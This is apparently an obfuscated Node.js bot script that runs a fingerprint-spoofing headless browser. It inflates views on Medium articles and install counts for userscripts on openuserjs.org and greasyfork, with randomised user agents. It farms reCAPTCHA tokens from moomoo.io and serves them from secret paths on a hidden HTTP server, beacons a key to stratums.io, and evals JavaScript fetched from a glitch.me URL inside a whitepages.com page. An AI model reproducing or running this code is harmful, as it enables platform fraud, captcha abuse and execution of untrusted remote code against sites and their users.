      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + X(0x4) + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + Y(0xc, '!kf]') + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + Y(0xd, 'kuSU') + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + W(0xf) + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + Y(0x16, 's%%d') + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0xa9 + 0x11 * 0x18c + -0x1af5
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const b7 = {
      f: '!kf]'
    };
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xd * 0x277 + -0xd5 * -0x2d + -0x115f * 0x4)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1f9a + 0xe7b + 0xf3b * -0x3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x2527 * 0x1 + 0x1b80 + 0xa0b), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x169 * 0x9 + 0x7e * -0x4 + 0xea9;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x79f * -0x1 + -0x15a6 * 0x1 + 0x1b * 0x85; w < getRandomInt(0x1fe8 + 0x1 * 0x1e9 + -0x2 * 0x10e8, 0x439 + 0x37a + 0x3d7 * -0x2); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xa3 * 0x2ce + 0x15ff8 + 0xa * 0x21f5);
        }
      }();
    }, 0x1435 + -0x9cd + 0x2 * -0x502), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x2b3 * -0x7 + -0x8e7 + -0x4a2 * -0x6;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y[Z(0x1)]('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x187b * -0x1 + 0x14f6 + -0x1 * 0x2d71, 0x182a + -0x1fc3 + 0x85 * 0xf)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        const a0 = c;
        return await (A && doFlags[a0(0x10)] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          const a1 = b;
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': a1(0x2, 'Q1&t')
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x3a5 * -0x1 + -0x774a + -0xf01f * -0x1);
    }, -0x230e + 0xadd * 0x2 + 0xdb8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a2 = b;
        try {
          let s = 0x3 * -0x497 + 0x1165 + 0x8 * -0x74;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t[a2(0x17, b7.f)](), r();
          await wait(0x30a * 0x6 + -0x1d * 0xb8 + 0x2 * 0x72a), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1a * -0x169 + 0x1da2 + -0x4 * 0x1093), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x17577a + 0x39b2d + -0xd3707);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1085 + -0x12ff * -0x1 + -0x2320);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0xfa8 + 0xa9a * -0x3 + -0x16 * -0xc5);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1e8e + 0x187d * 0x1 + 0x25a1);
}

function a() {
  const bm = [
    'nIXmWQytkmoqW7tcQ8or',
    'goto',
    'W7TXW7jNW6iwomkl',
    'captchaai',
    '0\x20(Windows',
    'easyfork.o',
    'y29Tl0bsEwfUrW',
    '6s8Xm4wylr',
    'ktepW7K9a8oyW73cR8or',
    'W4/dPrmWWQm0WPGLCLe',
    'y2XVC2u',
    'W6OxbSoRW6KhW7RcPZap',
    'kJhcP0ZcS0hcI8ksi8kE',
    'wev8bsSZWPBdPmkvhW',
    'yMXVy2S',
    'nJK4owm2zwe0nW',
    'zg9eDwfS',
    'aCojo8kFcZPufmoxW5S',
    'bytes',
    'newPage',
    'pCkWawJcGCk/WRT+WR0',
    's2fjCLHktgzzua',
    'mmk9igRdUmk9WQbWW7Ou',
    'F33cJvVcSq',
    'S9EkXX0QYD'
  ];
  a = function() {
    return bm;
  };
  return a();
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x23bb * -0x1 + -0x2ab * -0xd + -0x4669) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1 * 0x3dc + 0xdb8 * 0x1 + 0x1 * -0x1193));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x10a6 + -0x6b2 * -0x1 + -0x3e4 * 0x6, D['indexOf']('\x20'));
        return B ? E['slice'](-0x943 + 0xf16 + -0x5d3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3e2d * -0x1 + 0x266 * -0x1 + 0x67a3),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3e6d + 0x10d9 + 0x54a4),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x100d + 0x1609 + -0x2616; k < -0x1d5e + 0x176b + 0x5f7; k++)
    setTimeout(f, (-0x6 * 0x4133 + 0x185b7 + 0xebdb) * k * getRandomInt(0x1abf * -0x1 + 0xe21 * 0x1 + 0xc9f, -0x158b + -0x25 * 0x7f + 0x11 * 0x259));
  setInterval(() => {
    f();
    for (let l = 0x9ca + -0x1 * 0x17f3 + 0xe29; l < -0x1 * 0x256 + -0xdd6 + 0x1030; l++)
      setTimeout(f, (-0xb66d + 0x5 * -0x4639 + 0x2ffea * 0x1) * l * getRandomInt(-0x199f + -0x4c0 * 0x2 + 0x2320, -0x41b * -0x7 + 0x2f * 0x3 + -0x1d47));
  }, -0x37a95 * 0x7 + -0x59d506 + 0xa91d99);
